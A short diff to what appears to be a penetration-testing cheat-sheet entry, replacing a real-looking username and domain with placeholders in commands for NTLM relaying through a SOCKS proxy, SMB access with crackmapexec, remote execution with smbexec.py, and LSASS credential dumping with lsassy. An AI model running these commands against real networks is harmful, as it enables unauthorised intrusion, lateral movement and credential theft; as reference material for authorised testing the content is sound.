@@ -17,11 +17,11 @@ description: |
   
   now you can relay traffic through the socks proxy e.g:
 
-  	proxychains crackmapexec smb 10.1.0.73 -u ppaalm -p '' -d paragon
+  	proxychains crackmapexec smb 10.1.0.73 -u <user> -p '' -d <domain>
 
-    proxychains smbexec.py -no-pass paragon/ppaalm@10.1.0.160
+    proxychains smbexec.py -no-pass <domain>/<user>@10.1.0.160
 
-    proxychains lsassy 10.1.0.160 -u ppaalm -d paragon
+    proxychains lsassy 10.1.0.160 -u <user> -d <domain>
 
 command: |
   ntlmrelayx.py -tf targets.txt -socks -smb2support
